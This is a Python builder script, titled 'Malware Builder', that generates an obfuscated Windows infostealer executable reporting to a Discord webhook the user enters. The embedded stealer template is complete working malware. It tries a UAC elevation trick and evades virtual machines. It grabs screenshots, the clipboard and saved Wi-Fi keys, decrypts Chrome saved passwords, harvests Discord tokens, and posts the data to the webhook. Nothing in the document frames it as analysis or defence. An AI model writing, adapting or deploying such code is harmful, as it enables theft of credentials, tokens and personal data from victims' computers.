import os
import sys
import subprocess
import tkinter as tk
from tkinter import messagebox
import re
import shutil
import tempfile
import secrets

# =================== AUTO-INSTALL MISSING PACKAGES ===================
def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", package])

required_packages = ["pyinstaller", "pyarmor", "cryptography", "Pillow", "pywin32"]

missing = []
for pkg in required_packages:
    try:
        __import__(pkg.lower() if pkg != "pywin32" else "win32crypt")
    except ImportError:
        missing.append(pkg)

if missing:
    print(f"Installing missing packages: {', '.join(missing)}")
    for pkg in missing:
        install_package(pkg)
    print("Packages installed. Restarting builder...")
    os.execv(sys.executable, [sys.executable] + sys.argv)

# Now safe to import everything
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from PIL import ImageGrab
import base64, zlib, marshal, time, random, ctypes, socket, re, json, io

# =================== GUI FOR WEBHOOK INPUT ===================
def get_webhook():
    root = tk.Tk()
    root.title("Malware Builder")
    root.geometry("400x150")
    root.resizable(False, False)

    tk.Label(root, text="Enter your Discord Webhook URL:").pack(pady=10)
    webhook_entry = tk.Entry(root, width=50)
    webhook_entry.pack(pady=5)

    def build():
        webhook = webhook_entry.get().strip()
        if not re.match(r"https://discord\.com/api/webhooks/\d+/.+", webhook):
            messagebox.showerror("Error", "Invalid Discord webhook URL. Must be like: https://discord.com/api/webhooks/123/abc")
            return
        root.destroy()
        generate_malware(webhook)

    tk.Button(root, text="Build EXE", command=build).pack(pady=10)
    root.mainloop()

# =================== STEALER TEMPLATE (with placeholders) ===================
stealer_template = '''
import base64, zlib, time, os, sys, random, ctypes, socket, subprocess, re, json, secrets, requests
from pathlib import Path
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from PIL import ImageGrab
import win32crypt
import shutil
import io

# UAC Bypass (like Pysilon)
def uac_bypass():
    try:
        import win32com.client
        shell = win32com.client.Dispatch("WScript.Shell")
        shell.Run("powershell -windowstyle hidden -command \\"Start-Process cmd.exe /k -Verb RunAs\\"")
        sys.exit(0)
    except:
        pass

if ctypes.windll.shell32.IsUserAnAdmin() == 0:
    uac_bypass()

# Better Anti-VM
def is_vm():
    vm_procs = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vgauthservice.exe", "vgtray.exe"]
    for proc in vm_procs:
        if subprocess.getoutput(f'tasklist | findstr /i "{proc}"'):
            return True
    try:
        c = ctypes.windll.kernel32
        class M(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
        m = M(); m.dwLength = ctypes.sizeof(m)
        c.GlobalMemoryStatusEx(ctypes.byref(m))
        if m.ullTotalPhys // (1024*1024) < 3999: return True
    except: pass
    if os.cpu_count() < 4: return True
    return False

def _0x2(t=1337):
    time.sleep((t + random.randint(100, 1000)) / 1000)

def _0x6():
    try:
        g = ImageGrab.grab(all_screens=True)
        b = io.BytesIO()
        g.save(b, format="PNG")
        return base64.b64encode(b.getvalue()).decode()
    except: return ""

def _0x7():
    try:
        r = subprocess.run(["powershell", "-noprofile", "-Command", "Get-Clipboard"], capture_output=True, text=True)
        return r.stdout.strip()
    except: return ""

def _0x8(): return socket.gethostname()

def _0x9():
    w = []
    try:
        o = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True, stderr=subprocess.DEVNULL)
        p = re.findall(r"All User Profile\s*:\s*(.+)", o)
        for n in p:
            n = n.strip()
            o2 = subprocess.check_output(["netsh", "wlan", "show", "profile", n, "key=clear"], text=True, stderr=subprocess.DEVNULL)
            k = re.search(r"Key Content\s*:\s*(.+)", o2)
            if k: w.append({"ssid": n, "pass": k.group(1).strip()})
    except: pass
    return w

def _0x10():
    c = []
    if sys.platform != "win32": return c
    a = os.getenv("LOCALAPPDATA")
    if not a: return c
    ls = Path(a) / "Google" / "Chrome" / "User Data" / "Local State"
    ld = Path(a) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
    if not ls.exists() or not ld.exists(): return c
    try:
        with open(ls, "r", encoding="utf-8") as f:
            s = json.load(f)
        ek = base64.b64decode(s["os_crypt"]["encrypted_key"])[5:]
        mk = win32crypt.CryptUnprotectData(ek, None, None, None, 0)[1]
        td = Path(os.getenv("TEMP")) / f"{secrets.token_hex(8)}.db"
        shutil.copy(ld, td)
        import sqlite3
        conn = sqlite3.connect(str(td))
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, ep in cur.fetchall():
            if ep[:3] not in (b"v10", b"v11"): continue
            nonce, ct, tag = ep[3:15], ep[15:-16], ep[-16:]
            pt = AESGCM(mk).decrypt(nonce, ct + tag, None)
            c.append({"url": url, "username": user, "password": pt.decode(errors="ignore")})
        conn.close()
        os.unlink(td)
    except: pass
    return c

def _0x11():
    t = set()
    paths = [
        Path(os.getenv("APPDATA")) / "discord" / "Local Storage" / "leveldb",
        Path(os.getenv("APPDATA")) / "discordcanary" / "Local Storage" / "leveldb",
        Path(os.getenv("APPDATA")) / "discordptb" / "Local Storage" / "leveldb",
    ]
    pat = r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,}"
    for p in paths:
        if not p.exists(): continue
        for f in list(p.glob("*.ldb")) + list(p.glob("*.log")):
            try:
                with open(f, "r", errors="ignore") as fh:
                    for m in re.finditer(pat, fh.read()):
                        t.add(m.group())
            except: pass
    return list(t)

# Exfil to webhook
def exfil(data, webhook):
    key = os.urandom(32)
    nonce = os.urandom(12)
    aes = AESGCM(key)
    enc_data = aes.encrypt(nonce, json.dumps(data).encode(), None)
    payload = base64.b64encode(nonce + enc_data).decode()
    headers = {"X-Key": base64.b64encode(key).decode()}
    try:
        requests.post(webhook, data={"content": payload}, headers=headers, timeout=10)
    except:
        pass

def run():
    if is_vm():
        time.sleep(1800)
    data = {
        "info": {
            "hostname": _0x8(),
            "screenshot": _0x6(),
            "clipboard": _0x7(),
            "wifi": _0x9(),
            "timestamp": datetime.utcnow().isoformat()
        },
        "creds": {
            "browser_passwords": _0x10(),
            "discord_tokens": _0x11()
        }
    }
    exfil(data, "{webhook}")
    while True:
        time.sleep(86400)

run()
'''

# =================== GENERATE MALWARE EXE ===================
def generate_malware(webhook):
    try:
        # Write template with webhook
        code = stealer_template.replace("{webhook}", webhook)
        
        # Temp dir for build
        temp_dir = tempfile.mkdtemp()
        script_path = os.path.join(temp_dir, "stealer.py")
        with open(script_path, "w") as f:
            f.write(code)
        
        # Obfuscate and pack with pyarmor + pyinstaller
        # Pyarmor packs to EXE directly
        output_exe = "stealer.exe"
        subprocess.check_call([
            "pyarmor", "pack",
            "-e", "--onefile --noconsole --icon NONE",  # Spoof icon if you have one: --icon fake.ico
            script_path,
            "-n", output_exe
        ])
        
        # Clean up
        shutil.rmtree(temp_dir)
        
        print(f"Malware built: {os.path.abspath(output_exe)}")
        messagebox.showinfo("Success", f"EXE generated: {output_exe}\nTest in VM. Exfil to {webhook}")
    except Exception as e:
        messagebox.showerror("Error", f"Build failed: {str(e)}")
        sys.exit(1)

# Run the builder
if __name__ == "__main__":
    get_webhook()
